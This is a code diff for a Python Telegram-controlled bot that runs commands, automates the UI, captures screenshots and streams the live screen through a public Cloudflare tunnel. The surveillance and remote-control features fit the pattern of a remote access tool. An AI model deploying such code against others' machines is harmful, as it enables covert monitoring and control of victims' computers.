@@ -18,6 +18,8 @@ BASE  = f"https://api.telegram.org/bot{TOKEN}"
 TICK  = chr(96) * 3
 
 current_process = None
+livestream_proc = None
+livestream_url = None
 
 def send_message(chat_id, text, parse_mode='Markdown'):
     try:
@@ -81,12 +83,9 @@ def run_command(chat_id, cmd, is_python=False):
 def take_screenshot(chat_id):
     filename = "screenshot.png"
     try:
-        if os.name == 'nt':
-            ps_cmd = "powershell -command \"[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')|Out-Null;[Reflection.Assembly]::LoadWithPartialName('System.Drawing')|Out-Null;$S=[System.Windows.Forms.Screen]::PrimaryScreen;$B=New-Object System.Drawing.Bitmap($S.Bounds.Width,$S.Bounds.Height);$G=[System.Drawing.Graphics]::FromImage($B);$G.CopyFromScreen(0,0,0,0,$B.Size);$B.Save('screenshot.png',[System.Drawing.Imaging.ImageFormat]::Png);$G.Dispose();$B.Dispose();\""
-            subprocess.run(ps_cmd, shell=True, check=True)
-        else:
-            from PIL import ImageGrab
-            ImageGrab.grab().save(filename)
+        import mss
+        with mss.mss() as sct:
+            sct.shot(output=filename)
         send_photo(chat_id, filename)
         if os.path.exists(filename): os.remove(filename)
     except Exception as e: send_message(chat_id, f"Error: {e}")
@@ -178,35 +177,43 @@ def ui_automation(chat_id, action, params=None):
     except Exception as e: send_message(chat_id, f"UI Error: {e}")
 
 def livestream(chat_id):
+    global livestream_proc, livestream_url
+    if livestream_proc and livestream_proc.poll() is None:
+        send_message(chat_id, f"LiveStream already running: {livestream_url}")
+        return
+
     def run_server():
+        global livestream_proc, livestream_url
         try:
-            from flask import Flask, Response, send_file
-            from PIL import ImageGrab
+            from flask import Flask, Response
             import numpy as np
             import cv2
-            import io
+            import mss
 
             app = Flask(__name__)
-            last_frame_bytes = None
+            sct = mss.mss()
 
             def gen_frames():
                 while True:
                     try:
-                        img = ImageGrab.grab()
-                        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
+                        monitor = sct.monitors[1]
+                        sct_img = sct.grab(monitor)
+                        frame = np.array(sct_img)
+                        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                         h, w = frame.shape[:2]
-                        # Optimize resolution for mobile but keep aspect ratio
-                        new_w = 800
+                        new_w = 854
                         new_h = int(h * (new_w / w))
                         frame_resized = cv2.resize(frame, (new_w, new_h))
-                        _, buffer = cv2.imencode(".jpg", frame_resized, [int(cv2.IMWRITE_JPEG_QUALITY), 35])
+                        _, buffer = cv2.imencode(".jpg", frame_resized, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
                         frame_bytes = buffer.tobytes()
                         yield (b'--frame\r\n'
-                               b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')
-                        time.sleep(0.2) # ~5 FPS
+                               b'Content-Type: image/jpeg\r\n'
+                               b'Content-Length: ' + str(len(frame_bytes)).encode() + b'\r\n\r\n' +
+                               frame_bytes + b'\r\n')
+                        time.sleep(0.15)
                     except Exception as e:
                         print(f"Frame gen error: {e}")
-                        break
+                        time.sleep(1)
 
             @app.route("/")
             def index():
@@ -230,31 +237,29 @@ def livestream(chat_id):
             def stream():
                 return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
-            send_message(chat_id, "Starting Cloudflare tunnel...")
-
+            send_message(chat_id, "Starting LiveStream...")
             threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000, threaded=True, debug=False), daemon=True).start()
-            time.sleep(3)
+            time.sleep(2)
 
             cf_cmd = ["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"]
             env = os.environ.copy()
             env["TUNNEL_ORIGIN_CERT"] = ""
 
-            cf_proc = subprocess.Popen(cf_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, env=env)
+            livestream_proc = subprocess.Popen(cf_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, env=env)
 
-            url = None
-            start_time = time.time()
-            log_output = ""
-            while time.time() - start_time < 90:
-                line = cf_proc.stdout.readline()
-                if not line: break
-                log_output += line
-                print(f"[cf] {line.strip()}", flush=True)
-                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
-                if match:
-                    url = match.group(0); break
+            # Continuous drain thread to prevent pipe stall
+            def drain_output():
+                global livestream_url
+                for line in iter(livestream_proc.stdout.readline, ''):
+                    if not line: break
+                    print(f"[cf] {line.strip()}", flush=True)
+                    if not livestream_url:
+                        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
+                        if match:
+                            livestream_url = match.group(0)
+                            send_message(chat_id, f"LiveStream online: {livestream_url}")
 
-            if url: send_message(chat_id, f"LiveStream online: {url}")
-            else: send_message(chat_id, f"Failed to capture Cloudflare URL. Logs:\n{log_output[-500:]}")
+            threading.Thread(target=drain_output, daemon=True).start()
 
         except Exception as e: send_message(chat_id, f"LiveStream Error: {e}")
 
